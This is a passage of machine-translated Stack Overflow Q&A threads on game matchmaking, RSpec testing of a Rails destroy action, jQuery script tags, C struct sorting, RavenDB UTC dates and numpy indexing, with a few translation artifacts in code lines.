首先，这取决于你如何衡量球员的技能。有多种方法可以做到这一点，每种方法都有自己的衡量多个玩家“平均技能”的方法。

一个好的方法是采用已经开发的系统，Elo 评级（[http://en.wikipedia.org/wiki/Elo_rating_system](http://en.wikipedia.org/wiki/Elo_rating_system)）如今已被广泛使用，但要知道，如果你想要一个简单的实现不会很好地工作在有多名球员的球队中衡量个人球员的技能。

话虽如此，假设您有一个系统，其中团队的评分是其成员评分的平均值。另外，让我们假设玩家在技能水平之间均匀分布。一个好的第一种方法是在同一个游戏中将具有相同技能水平的玩家分组。一支球队有 2 名 9 分和 2 名 1 分球员，而另一支球队有 4 名 5 分球员的比赛不会是一场好比赛。

因此，开始将技能水平相近的玩家分组到多个最多 8 人的组中。（一名球员可能在其中不止一个）。您可以通过将技能级别为 1-4 的球员分组，另一个为 2-5、3-6 等的球员组来做到这一点。当这些组中的任何一个有 8 名球员时，您可以将他们安排成一场比赛，并将球队排序一种方式，每个人都有大约相同的平均值。

现在，存在玩家等待时间过长的问题，因此如果玩家等待超过 1 分钟，您可以让技能 4 的玩家加入技能等级 5-8 的玩家组，例如还要记住玩家所涵盖的技能范围组应随队列中的玩家数量而变化。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-12T02:15:51.470

鉴于您的玩家等级数量有限，您可以围绕它构建您的算法。有10个队列，每个等级一个。跟踪每个条目的插入时间，以便您始终知道等待时间最长的排名 i 的玩家是谁（通过检查队列 i 的头部）。

从那里你可以形成一个游戏如下。

1.  将等待时间最长的四个人组成一个团队。
2.  得到他们排名的总T
3.  遍历 T 的每个 4 分区，(i,j,k,l) - 检查队列 i,j,k,l 的头部并添加它们的等待时间，找到总共等待时间最长的四个人，总排名的 T. 将他们组成第二队并开始比赛。
4.  （如果在步骤 3 中没有找到，请等待（更好的匹配）或将搜索扩展到 [T-delta, T+delta]（更公平的等待时间））

整数 T 的 4 分区是 (i,j,k,l)，使得 i+j+k+l = T。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-09-09T07:05:03.893

衡量玩家技能是一个单独的话题，我不会给出任何想法。使用现有方案（例如 ELO 或 Microsoft 研究开发的公式[http://en.wikipedia.org/wiki/TrueSkill](http://en.wikipedia.org/wiki/TrueSkill)或许多其他方案之一）我认为是一个很好的起点。

一旦你有了你的幻数，就会有很多考虑因素，比如你（和你的玩家）的偏好。虽然它不是用 C++ 编写的，但您可以在下面找到我的配对系统迷你原型（100 行 f# 代码，您可以在[http://www.tryfsharp.org/Create](http://www.tryfsharp.org/Create)上玩，无需下载任何工具）。

我的设计目标是：

*   让它运行得快（不要为了提高团队平衡而进行长时间的迭代），考虑到可能有 100000 名玩家，其中几百人在队列中，被分配到可能要开始的 50-100 场比赛，太科学是也许不是一个好主意。但我宁愿将其视为一个实验性框架，您可以将改进/想法放入其中的功能称为“ImproveTeams”。
*   不要尝试在给定时间跨多个新游戏进行优化。
*   尝试为玩家提供他们自己技能水平的游戏体验，而不是为团队配备绝对的新手和职业游戏玩家。

这个怎么运作：

*   池按玩家评分降序排列。
*   自上而下（最好的球员到更差的球员），球队通过简单地拼接前 2 个 N 来组装（N = 每支球队的球员数量）。这样做会导致 A 队总是比 B 队更好或同样强大。
*   使用团队 a、团队 b 和池的其余部分的信息调用 ImprovementTeams。ImprovementTeams 迭代两支球队，计算技能增量，然后根据它是正数还是负数，将两支球队阵列中相同位置的球员洗牌。

这同样适用于剩余在池中的玩家，在第一场比赛配对后，直到服务器容量（免费游戏槽）用完或玩家池为空。

缺点：糟糕的玩家等待时间更长，因为他们总是最后处理。一个简单的修改可以通过简单地在上面描述的自上而下工作的算法与自下而上工作的双重解决方案之间交替来改善这一点。

```
type Rating = uint32
type RatingDiff = int32
type Player = { name : string; rating : Rating }

// tuple of:  Candidate player in team a, Canditate players in team b, Remainder of pool
type WorkingSet = Player array * Player array * Player array

let pool : Player array = 
    [|  { name = "Hugo"; rating = 1100u }
        { name = "Paul"; rating = 800u }
        { name = "Egon"; rating = 1800u }
        { name = "John"; rating = 1300u }
        { name = "Rob"; rating = 400u }
        { name = "Matt"; rating = 1254u }
        { name = "Bruce"; rating = 2400u }
        { name = "Chuck"; rating = 2286u }
        { name = "Chuck1"; rating = 2186u }
        { name = "Chuck2"; rating = 2860u }
        { name = "Chuck3"; rating = 1286u }
        { name = "Chuck4"; rating = 786u }
    |]

let SortByRating (pool : Player array) : Player array =
    pool 
    |> Array.sortWith 
        (fun (p1 : Player) (p2 : Player) -> 
            match (p1.rating,p2.rating) with 
            | (r1,r2) when r1 > r2 -> -1 
            | (r1,r2) when r1 < r2 -> 1 
            | _ -> 0 
        )

let evens n = 2 * n 
let odds n = 2 * n + 1

// Note: Since the input is sorted by player level, obviously team A is always stronger or equal in strength to team B
let Split (n : int) (a : Player array) : WorkingSet =
    let teamA : Player array = [| for i in 0 .. (n-1) -> a.[evens i] |]
    let teamB : Player array = [| for i in 0 .. (n-1) -> a.[odds i] |]
    let remainder = Array.sub a (2*n) ((Array.length a) - 2 * n)
    ( teamA, teamB, remainder )

 // This is the function where teams get improved - can be as well a recursive function.
 // Anyone is invited to provide alternate, better implementations!
let ImproveTeams (ws : WorkingSet) : WorkingSet =
    let a,b,r = ws
    let R2RD (r : Rating) : RatingDiff =
       let r1 : RatingDiff =  int32 r
       r1
    let UpdateScore (score : RatingDiff) (pa : Player) (pb : Player) : RatingDiff =
        score + (R2RD pa.rating) - (R2RD pb.rating) 
    let improved : RatingDiff * Player array * Player array =
        Array.fold2 
            (fun s pa pb ->
                let score,teamA, teamB = s
                let betterPlayer p1 p2 =
                    match (p1.rating,p2.rating) with
                    | (r1,r2) when r1 >= r2 -> p1
                    | _ -> p2
                let worsePlayer p1 p2 =
                    match (p1.rating,p2.rating) with 
                    | (r1,r2) when r1 >= r2 -> p2
                    | _ -> p1
                let bp = betterPlayer pa pb
                let wp = worsePlayer pa pb
                match score with
                | x when x > 0 -> (UpdateScore x wp bp, Array.append teamA [| wp |], Array.append teamB [| bp |])
                | _ -> (UpdateScore score bp wp, Array.append teamA [| bp |], Array.append teamB [| wp |]) 
             ) (0, [||], [||]) a b
    let ns,nta,ntb = improved
    (nta, ntb,r)    

let rec CreateTeams (maxPlayersPerTeam : int) (players : Player array) : WorkingSet =
    let sortedPool = SortByRating players
    match (Array.length sortedPool) with
    | c when c >= (maxPlayersPerTeam * 2) ->
        Split maxPlayersPerTeam sortedPool
        |> ImproveTeams            
    | 0 -> ( [||], [||], [||] )
    | _ -> CreateTeams (maxPlayersPerTeam-1) players    

let ShowResult (result : WorkingSet) : unit =
    let ShowPlayer p =
        printf "%s - %d" p.name p.rating
    let a,b,r = result
    let Score (pl : Player array) : Rating =
        Array.fold (fun s p -> s + p.rating) 0u pl
    printfn "Team A\t\t\t| Team B"
    Array.iter2 
        ( fun pa pb -> 
            ShowPlayer pa 
            printf "\t\t\t| " 
            ShowPlayer pb
            printfn ""
        ) a b
    let sa = Score a
    let sb = Score b
    printfn "Score Team A: %d\t\t\t| Score Team B: %d" sa sb
    printfn "Players still in pool: "
    Array.iter
        (fun p -> 
            ShowPlayer p
            printfn ""
        ) r

CreateTeams 4 pool |> ShowResult 
```

# ruby-on-rails - RSpec 测试破坏方法（Rails Tutorial 3.2 Ch. 9, Ex. 10）

> ID：10989427
> 
> 赞同：15
> 
> 时间：2012-06-12T01:13:29.680
> 
> 标签：ruby-on-rails, rspec, railstutorial.org

注意：我已经阅读[了这个](https://stackoverflow.com/questions/10907325/rspec-test-for-destroy-if-no-delete-link)问题和答案，但由于某种原因，代码对我不起作用。（见下文我得到的错误）

Rails 教程第 9 章中的练习 10 要求您： 修改 [for users] 的 destroy 操作以防止管理员用户销毁自己。（先写一个测试。）

这里棘手的部分是测试它，因为应用程序已经为当前用户隐藏了“删除”链接，所以你必须直接进行 http 请求。

我让代码正常工作，并通过删除隐藏当前用户的删除链接的代码来测试它。果然，如果我单击当前登录用户的删除链接，它会重定向我并给我通知消息。

**来自 users_controller.rb**

```
 def destroy
    @user = User.find(params[:id])
    if current_user?(@user)
      redirect_to users_path, notice: "You can't destroy yourself."
    else
      @user.destroy
      flash[:success] = "User destroyed."
      redirect_to users_path
    end
  end 
```

我遇到的问题是为此编写测试，将发送删除请求并调用销毁方法。我尝试了[Rspec 测试中的解决方案，如果没有删除链接就销毁](https://stackoverflow.com/questions/10907325/rspec-test-for-destroy-if-no-delete-link)，我在这里复制：

**来自 user_pages_spec.rb**

```
 describe "destroy" do
    let(:admin) { FactoryGirl.create(:admin) }

    it "should not allow the admin to delete herself" do
      sign_in admin
      #expect { delete user_path(admin), method: :delete }.should change(User, :count)
      expect { delete :destroy, :id => admin.id }.should_not change(User, :count)
    end
  end 
```

但是当我运行这个时，我从 RSpec 得到这个错误

```
Failures:

  1) User Pages destroy should not allow the admin to delete herself
     Failure/Error: expect { delete :destroy, :id => admin.id }.should_not change(User, :count)
     ArgumentError:
       bad argument (expected URI object or URI string)
     # ./spec/requests/user_pages_spec.rb:180:in `block (4 levels) in <top (required)>'
     # ./spec/requests/user_pages_spec.rb:180:in `block (3 levels) in <top (required)>' 
```

所以，我的问题是：1）为什么上面的代码失败了？2）如何模拟“删除”以在我的控制器中调用销毁操作？

环境：Mac OSX ruby​​ 1.9.3p194 Rails 3.2.3

用于测试的宝石：
组 :test do gem 'rspec-rails', '2.9.0' gem 'capybara', '1.1.2' gem 'rb-fsevent', '0.4.3.1', :require => false gem '咆哮'，'1.0.3'宝石'guard-spork'，'0.3.2'宝石'spork'，'0.9.0'宝石'factory_girl_rails'，'1.4.0'结束

**更多信息** 我已经尝试了**很多**方法来尝试模拟单击删除链接，但似乎都没有。我一直在使用调试器 gem 来查看是否调用了 destroy 方法。在单击链接以删除其他用户的测试中，destroy 方法被调用并且工作正常：

```
it "should be able to delete another user" do
  expect { click_link('delete') }.to change(User, :count).by(-1)
end 
```

但是我没有尝试直接生成删除请求来调用destroy方法。

谢谢你的帮助！

将要

** 更新 **

我尝试了 DVG 的建议：

```
describe "destroy" do
    let(:admin) { FactoryGirl.create(:admin) }

    it "should not allow the admin to delete herself" do
      sign_in admin
      #expect { delete user_path(admin), method: :delete }.should change(User, :count)
      expect { delete :destroy, :id => admin }.to_not change(User, :count)
    end
  end 
```

并得到这个错误：

```
6) User Pages destroy should not allow the admin to delete herself
     Failure/Error: expect { delete :destroy, :id => admin }.to_not change(User, :count)
     ArgumentError:
       bad argument (expected URI object or URI string)
     # ./spec/requests/user_pages_spec.rb:190:in `block (4 levels) in <top (required)>'
     # ./spec/requests/user_pages_spec.rb:190:in `block (3 levels) in <top (required)>' 
```

**解决方案**

我在 FOREVER 之后想通了。

我不得不使用 Rack::Test 来发出 DELETE 请求，但是 Capybara 和 Rack::Test 不共享相同的 MockSession，所以我不得不拉入 :remember_token 和 :!sample_app_session cookie 并将它们放入 DELETE 请求中手动。这是有效的。（下面列出的另一个问题是我有一个 force_ssl 语句，它没有让我的破坏操作被调用。

```
describe "destroy" do
    let!(:admin) { FactoryGirl.create(:admin) }

    before do
      sign_in admin
    end

    it "should delete a normal user" do
      user = FactoryGirl.create(:user)
      expect { delete user_path(user), {},
       'HTTP_COOKIE' => "remember_token=#{admin.remember_token},
        #{Capybara.current_session.driver.response.headers["Set-Cookie"]}" }.
        to change(User, :count).by(-1)
    end

    it "should not allow the admin to delete herself" do
      expect { delete user_path(admin), {},
       'HTTP_COOKIE' => "remember_token=#{admin.remember_token},
        #{Capybara.current_session.driver.response.headers["Set-Cookie"]}" }.
       to_not change(User, :count)
    end
  end 
```

在我的 users_controller.rb 中的 before_filters 之后，我有一个 force_ssl 语句，这以某种方式把事情扔掉了，所以我从来没有去破坏行动。

```
class UsersController < ApplicationController
  before_filter :signed_in_user,  only: [:edit, :update, :index]
  before_filter :existing_user,   only: [:new, :create]
  before_filter :correct_user,    only: [:edit, :update]
  before_filter :admin_user,      only: :destroy

  #force_ssl

  def index
    @users = User.paginate(page: params[:page])
  end

  def show 
    @user = User.find(params[:id])
    @microposts = @user.microposts.paginate(page: params[:page])
  end

  def destroy
    @user = User.find(params[:id])
    if current_user?(@user)
      redirect_to users_path, notice: "You can't destroy yourself."
    else
      @user.destroy
      flash[:success] = "User destroyed."
      redirect_to users_path
    end
  end 
```

这些有助于找到解决方案

[https://gist.github.com/484787](https://gist.github.com/484787)

[http://collectiveidea.com/blog/archives/2012/01/05/capybara-cucumber-and-how-the-cookie-crumbles/](http://collectiveidea.com/blog/archives/2012/01/05/capybara-cucumber-and-how-the-cookie-crumbles/)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-27T22:37:56.923

我使用以下方法解决了同样的问题：

```
describe "should not be able to delete themselves" do
  it { expect { delete user_path(admin) }.not_to change(User, :count) }
end 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-22T18:34:32.660

CallumD 的解决方案对我有用，并且似乎与 Michael Hartl 教程的其余部分推荐的技术最一致。但我想稍微收紧语法，使其与同一教程中的其他规范更加一致：

```
it "should not be able to delete itself" do
  expect { delete user_path(admin) }.not_to change(User, :count)
end 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-06-12T06:33:44.490

您混淆了作为集成测试并在模拟浏览器中执行的 rspec-rails 请求规范和单独测试控制器的控制器规范。`delete(action, *args)`（和`get`，`post`等等） - 是一种模拟来自 ActionController::TestCase 的请求的方法，因此它在您的测试中不可用。

因此，您唯一的选择是在浏览器中模拟点击。我不知道您如何隐藏删除链接，如果 html 存在但隐藏，您应该能够单击它。如果它不存在（在生成视图时在服务器端删除），您可以使用 capybara `page.execute_script`（但您必须为此示例启用 javascript `:js => true`）。您可以将链接添加回来：

```
page.execute_script("$('body').append("<a href="/users/1" data-method="delete" rel="nofollow">Destroy</a>")") 
```

或进行ajax调用：

```
page.execute_script("$.ajax({type:'DELETE',url:'/users/1'})") 
```

没有测试，但这样的东西应该可以工作。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2015-03-12T13:10:01.843

这就是我最终得到的（Rspec 3.2）：

```
describe 'DELETE destroy' do
  before :each do
    delete :destroy, { id: current_partner_role }
  end

  it 'destroys role' do
    expect(assigns(:role).destroyed?).to be true
  end 
```

“毁了？” 方法本身是由 Rails 指定的，所以恕我直言，应该可以依赖它。

[https://github.com/rails/rails/blob/5142d5411481c893f817c1431b0869be3745060f/activerecord/lib/active_record/persistence.rb#L91](https://github.com/rails/rails/blob/5142d5411481c893f817c1431b0869be3745060f/activerecord/lib/active_record/persistence.rb#L91)

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2012-06-12T03:25:59.027

试试这个：

```
expect { delete :destroy, :id => admin }.to_not change(User, :count) 
```

# jquery - jquery 不工作/编辑器添加符号

> ID：10989431
> 
> 赞同：1
> 
> 时间：2012-06-12T01:14:13.470
> 
> 标签：jquery, toggle, text-editor, symbols, jsfiddle

这是两个问题合二为一，所以我们开始吧。

我有一个从 jsfiddle 获得的简单代码（位于[http://jsfiddle.net/tedp/aL7Xe/1/](http://jsfiddle.net/tedp/aL7Xe/1/)）

但是当我把它放在我的网站上时它不会调用 jquery 函数（在[http://beattrack.net/test.php#](http://beattrack.net/test.php#)的现场演示）。

此外，它还在结尾添加了一些有趣的符号。这是我的错还是我的文本编辑器的错？我正在使用 textwrangler——另存为 UTF-8。当我尝试保存到 ISO Latin 9 时，它说有无法命名的字符——它不仅仅发生在这个网页上。这是一个屏幕截图：

![截屏](../Images/91198b9c6dd32e3754e24a8f3a85ad08.png)

```
<html>
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>

<style type="text/css">
    #menucontainer {
        display:none;
    }​
</style>

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" />
  $('html').click(function() {
     $('#menucontainer').hide(); 
  });

  $('#menuwrap').click(function(event){
     event.stopPropagation();
  });

  $('#menutoggle').click(function(event){
     $('#menucontainer').toggle();
  });
</script>
</head> 

<body>
 <div id="menuwrap">
  <a href="#" id="menutoggle">Menu Toggle</a>
  <ul id="menucontainer">
    <li><a href="#">One</a></li>
    <li><a href="#">Two</a></li>
    <li><a href="#">Three</a></li>
  </ul>
 </div>​

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T01:22:28.280

从脚本标签中删除该`src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"`属性，这应该可以工作。为 jquery 创建一个新的脚本标签：

```
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
<script type="text/javascript">
  $('html').click(function() {
     $('#menucontainer').hide(); 
  });

  $('#menuwrap').click(function(event){
     event.stopPropagation();
  });

  $('#menutoggle').click(function(event){
     $('#menucontainer').toggle();
  });
</script> 
```

另外，将第二个元素放在 .

至于奇怪的字符，请尝试在 PHP 代码中使用 HTTP 标头来指定页面是 UTF-8 格式。我的浏览器说您页面的编码是 ISO-8859-1，因此是奇怪的字符。

```
header("Content-Type: text/html; charset=utf-8"; 
```

# iphone - Objective-C 上的像素分析

> ID：10989432
> 
> 赞同：0
> 
> 时间：2012-06-12T01:14:29.050
> 
> 标签：iphone, objective-c, cocoa, uiimage, pixels

我可能要求不可能，但我需要一种经济的方法来检查图像的哪些像素大致属于这些[类别](https://imgur.com/1Hz7c)。我想在 iPhone 上做这个，这就是问题（处理能力）。有这个[帖子](https://stackoverflow.com/questions/448125/how-to-get-pixel-data-from-a-uiimage-cocoa-touch-or-cgimage-core-graphics)，但过程似乎太长了。也许像 .NET 的 GetPixel() 这样的东西可能会起作用。
帮助？:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:21:35.530

我不太明白你所说的“归类”，但你可以尝试使用[GPUImage](https://github.com/BradLarson/GPUImage)并创建一个自定义过滤器。GPUImage 使用 OpenGL 和硬件加速，并且比在单个线程中分离像素数据要快得多。

# c++ - 适用于 Linux 和 Windows 的 C 和 C++

> ID：10989434
> 
> 赞同：0
> 
> 时间：2012-06-12T01:14:49.480
> 
> 标签：c++, c, windows, linux

在编写 Java 应用程序时，我无需过多担心在 Linux 和 Windows 环境中的执行。对于 C 和 C++，有没有我可以应用的工具或技术？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-12T01:21:30.457

我推荐QT：http: [//qt.nokia.com/products/](http://qt.nokia.com/products/)

它不仅是一个出色的跨平台 GUI 库，而且还具有满足许多其他常见需求的跨平台库——比如网络。

更不用说它有自己漂亮的 IDE。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-12T01:23:08.263

为了用 C++ 编写跨平台代码，通常有两种主要的技术并行使用：

1.  编写符合标准的代码。根据定义，您编写的任何符合标准且不使用任何特定于平台的库的 C++ 代码都是跨平台的。所有符合 C++ 的编译器都必须能够编译它。然而，这不会让你一路走好，因为有很多事情你不能单独使用标准库来做。所以...

2.  使用跨平台库，例如 Boost。您编写的使用 Boost（或其他跨平台库）的代码本身就是跨平台的。Boost 本身的实现细节往往不是。但是，如果您的目标是能够编写一组同时适用于 Windows 和 Linux 的代码，那么您可以使用 Boost 来实现。

# c - 如何在 C 中按特定模式对结构进行分组

> ID：10989435
> 
> 赞同：1
> 
> 时间：2012-06-12T01:14:52.723
> 
> 标签：c, struct, grouping

继我之前的问题之后，我正在寻找一种方法来按类别组织以下结构，*就像现在一样*，但在组之间进行排序。

例如， Group`Meats`大于 group `Drinks`，所以`Meats`group 应该在 上面`Drinks`，依此类推。

到目前为止，我了解使用的部分`qsort()`，但不确定分组部分。这是我正在寻找的输出（我绝对愿意接受更好的方法）

```
 Meats   -   43.00
         Meats,Chicken   -   27.00
            Meats,Beef   -   9.00
            Meats,Pork   -   4.00
          Meats,Turkey   -   3.00

                Drinks   -   33.00
         Drinks,Coffee   -   20.00
          Drinks,Pepsi   -   10.00
            Drinks,Tea   -   3.00

                Fruits   -   25.00
         Fruits,Grapes   -   13.00
          Fruits,Melon   -   10.00
          Fruits,Apple   -   2.00 
```

*工作代码：*

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct st_ex {
    char product[96];
    float price;
};

int struct_cmp_by_product(const void *a, const void *b) {
    struct st_ex *ia = (struct st_ex *)a;
    struct st_ex *ib = (struct st_ex *)b;

    int p;
    char *iaa = ia->product, *ibb = ib->product;
    while (1) {
        int c = *iaa;
        int d = *ibb;
        if(c == ',') c = 0;
        if(d == ',') d = 0;
        if(c != d || !c || !d) {
            p = c - d; break;
        }
        ++iaa;
        ++ibb;
    }
    if (p) return p;
    return ia->price < ib->price;
}

int main() {
    struct st_ex structs[] = {
        {"Fruits", 25},
        {"Meats,Beef", 9},
        {"Fruits,Apple", 2},
        {"Meats,Chicken", 27},
        {"Fruits,Grapes", 13},
        {"Meats", 43},
        {"Fruits,Melon", 10},
        {"Meats,Pork", 4},
        {"Meats,Turkey", 3},
        {"Drinks,Tea", 3},
        {"Drinks,Coffee", 20},
        {"Drinks,Pepsi", 10},
        {"Drinks", 33},

    };
    size_t structs_len = sizeof(structs) / sizeof(struct st_ex);
    qsort(structs, structs_len, sizeof(struct st_ex), struct_cmp_by_product);
    size_t i;
    for(i=0; i<structs_len; i++)
        printf("%30s   -   %.2f\n", structs[i].product, structs[i].price);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T02:23:03.327

您可能需要更复杂的数据类型，以便您可以按价格和类别进行分组。此外，最简单的方法将需要两种排序（因此，您有两个排序功能）。就像是：

```
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct category {
    char name[ 12 ];
    float price;
};

struct group {
    char name[ 12 ];
    float price;
    struct category cats[ 5 ]; // use a linked-list; this is for demo  
};

int cmp_by_group(const void *a, const void *b) {
    struct group const *ia = a;
    struct group const *ib = b;

    return (ia->price < ib->price);
}

int cmp_by_category(const void *a, const void *b) {
    struct category const *ia = a;
    struct category const *ib = b;

    return (ia->price < ib->price);
}

int main() {    
    struct group structs[] = {
        {"Fruits", 25, {{"Apple", 2}, {"Grapes", 13}, {"Melon", 10}}},
        {"Meats", 43, {{"Beef", 9}, {"Chicken", 27}, {"Pork", 4}, {"Turkey", 3}}},
        {"Drinks", 33, {{"Tea", 3}, {"Coffee", 20}, {"Pepsi", 10}}}
    };
    for (size_t i = 0; i < 3; ++i) {
        qsort(structs[ i ].cats, 3, sizeof(struct category), cmp_by_category);
    }

    size_t structs_len = sizeof(structs) / sizeof(struct group);
    qsort(structs, structs_len, sizeof(struct group), cmp_by_group);
    size_t i;
    for(i=0; i<structs_len; i++) {
        printf("%s   -   %.2f\n", structs[i].name, structs[i].price);
        for (size_t j = 0; j < 3; ++j)
            printf("%s,%s   -   %.2f\n", structs[i].name, structs[i].cats[ j ].name, structs[i].cats[ j ].price);
    }
    return 0;
} 
```

（不过，您将需要修复理由部分。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:57:12.007

通常，您会在单个值之后而不是在它们之前打印组的聚合值，因为它更容易编程。因此，“肉类”的摘要行将出现在“肉类，Xxxx”的 4 个详细信息行之后。

由于您想按类别降序打印数据，我相信您将不得不对数据进行两次传递。在第 1 步中，您将累积不同类别（肉类、饮料、水果）的总和 (SUM)。在第 2 步中，您将根据两个标准对数据进行排序 - 类别的聚合，然后按类别内的价格。我希望对数据进行一些预处理，以便更容易排序，将类别分开。您还需要决定如何保留类别的 SUM。我认为您排序的结构应该有额外的类别字段和类别内的价格总和。然后，您可以在第二遍时相当轻松地对数据进行排序。

所以，我认为大纲处理可能是：

```
struct reporting
{
    char     category[32];
    float    cat_sum;
    char     product[96];
    float    price;
}; 
```

*   扫描`struct st_ex`数据记录`struct reporting`，为每条记录创建一条记录，并为每个类别 `struct st_ex`创建一条附加记录：`struct reporting`
    *   识别类别并确保有`struct reporting`该类别的记录（其中`category`和`product`字段包含相同的字符串）。
    *   将`st_ex`价格添加到相关类别（汇总）。
    *   将`struct st_ex`记录复制到自己的`struct reporting`记录中。
*   将类别记录（类型`struct reporting`）添加到要排序的列表中。
    *   每个类别记录中的`price`和`cat_sum`值将相同。
    *   每个类别记录中的`category`和`product`值将相同。
*   将`cat_sum`每个`struct reporting`记录的设置为`price`类别记录中的值（因此每个肉类记录具有相同的 值`cat_sum`）。
*   按以下方式对`struct reporting`记录进行排序：
    *   的降序`cat_sum`。
    *   的降序`category`（以防两个类别碰巧共享相同的`cat_sum`）。
    *   的降序`price`。
    *   降序排列`product`（以防两种产品共享相同的类别和价格）。
*   按排序顺序打印记录。

这成为此时的控制中断报告。谷歌搜索“控制中断报告”会发现一些有用的材料，但（仅此一次）维基百科页面不是从中获取信息的地方之一（它是一个孤立的页面，只是一个存根）。

* * *

我希望这足够清楚，但这不是我最好的解释，我担心。我认为这些想法是合理的，但我能理解我想说的话——我不确定这是否对其他人有帮助。

# datetime - 为什么 RavenDB 在没有 UTC 标记的情况下存储我的 DateTime？

> ID：10989436
> 
> 赞同：2
> 
> 时间：2012-06-12T01:15:11.343
> 
> 标签：datetime, ravendb, asp.net-web-api

我有一个要保存到 RavenRB（构建 1.0.960）的 C# 对象，DateTime 是通用的 - 但 RavenDB 将其存储为本地时间`"Time": "2012-06-12T13:07:39.0000000"`

然后，当我使用 session.Query().Where()... 并传入通用时间时，我的对象不会返回...因为比较它 12 小时（我是 UTC+1200）不正常。

我究竟做错了什么？？

[编辑]

好的 - 我知道问题出在哪里。我正在将我的对象 (JSON) 发布到服务器，并以 UTC 格式发送它（无时区偏移，“2012-06-12T13:07:39.00Z”） - 我天真地期望 Asp.net Web API将其反序列化为 UTC Kind 的对象 - 就像它被发送一样 - 但不是。它被反序列化为本地服务器时间。这意味着当我将对象保存到 Raven 时，Raven 将其存储为本地时间（没有 Z 标识符）。啊！我希望我的所有日​​期都以 UTC 格式存储在数据库中（根据最佳实践）！

试图侵入 Web API 序列化是一件非常痛苦的事情。Raven 可以通过一些魔法标志来拯救我吗？它会在保存之前将所有日期转换为 UTC？在保存之前，我不想在服务器上逐个属性地反映我的对象，查找 DateTimes，并将它们转换为 UTC……EEEW！

建议？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-17T21:21:06.720

通过将 Json.net 作为 ASP.NET MVC 4 RC 中的默认序列化程序包含在内，此问题已得到解决。像这样配置它：

```
GlobalConfiguration.Configuration.Formatters.JsonFormatter.SerializerSettings.D‌​ateTimeZoneHandling = Newtonsoft.Json.DateTimeZoneHandling.Utc; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T06:37:39.683

Adam，检查 Time.Kind 属性，RavenDB 应将日期时间对象以 UTC 存储为：

```
"Time": "2012-06-12T13:07:39.0000000Z" 
```

注意最后的Z。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T23:10:35.887

Scott Hanselman 详细阐述了[ASP.NET Web Api 中 JSON 日期](http://www.hanselman.com/blog/OnTheNightmareThatIsJSONDatesPlusJSONNETAndASPNETWebAPI.aspx)的痛苦。看来他们希望在最终发布之前纠正这个问题。[同时，他指出了一种相对直接的方法，将序列化程序换成在此处](http://blogs.msdn.com/b/henrikn/archive/2012/02/18/using-json-net-with-asp-net-web-api.aspx)使用 JSON.NET 。

# python - 如何用数组（或任何其他支持加法的东西，以便它可以偏移）干净地索引 numpy 数组

> ID：10989438
> 
> 赞同：11
> 
> 时间：2012-06-12T01:15:26.220
> 
> 标签：python, numpy, indexing, offset

解释我的问题的最简单方法可能是举个例子，所以让我定义一些数组：

```
>>> test = arange(25).reshape((5,5))
>>> test
array([[ 0,  1,  2,  3,  4],
      [ 5,  6,  7,  8,  9],
      [10, 11, 12, 13, 14],
      [15, 16, 17, 18, 19],
      [20, 21, 22, 23, 24]])
>>> Xinds = array([1,2,3])
>>> Yinds = array([1,2,3]) 
```

现在，如果我想要第 1、2 和 3 行以及第 0 列中的元素，我可以这样做：

```
>>> test[Yinds,0]
array([ 5, 10, 15]) 
```

如果我想要第 1、2 和 3 行以及所有列中的项目，我可以去：

```
>>> test[Yinds, :]
array([[ 5,  6,  7,  8,  9],
       [10, 11, 12, 13, 14],
       [15, 16, 17, 18, 19]]) 
```

但是，如果我尝试扩展它以获取第 1、2 和 3 行以及第 1、2 和 3 列中的元素，——惊喜！-- 我改为获取 (1,1)、(2,2) 和 (3,3) 中的元素

```
>>> test[Yinds, Xinds]
array([ 6, 12, 18]) 
```

而不是我想要的：

```
>>> test[Yinds, :][:, Xinds]
array([[ 6,  7,  8],
       [11, 12, 13],
       [16, 17, 18]])
>>> test[1:4,1:4]
array([[ 6,  7,  8],
       [11, 12, 13],
       [16, 17, 18]]) 
```

我意识到我可以定义一个切片，但我希望能够为索引添加一个偏移量（例如，Yinds+offset），而切片无法做到这一点。

我可以做类似的事情

```
>>> xStart = 1
>>> xEnd   = 4
>>> yStart = 1
>>> yEnd   = 4

>>> offset = 1
>>> test[yStart+offset:yEnd+offset, xStart+offset:xEnd+offset]
... 
```

或者

```
>>> Xinds = array([1,4])
>>> Yinds = array([1,4])

>>> offset = 1
>>> test[slice(*(Yinds+offset)), slice(*(Xinds+offset))]
... 
```

但两者都不是特别干净。

Monkey 将加法运算符修补到 slice 似乎不是一种选择，并且从 slice 继承以添加运算符似乎也不起作用；我收到错误消息，“类型‘切片’不是可接受的基本类型”。(*Grumble* 这在 Ruby 中不会是问题 *Grumble*)

所以，我的问题是，用可以存储和偏移的东西访问（多于一维）子数组的最干净的方法是什么？

到目前为止的选项：

*   测试[Yinds+offset, :][:, Xinds+offset]
*   测试[yStart+offset:yEnd+offset, xStart+offset:xEnd+offset]
*   测试[slice(*(Yinds+offset)), slice(*(Xinds+offset))]

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-06-12T01:32:04.080

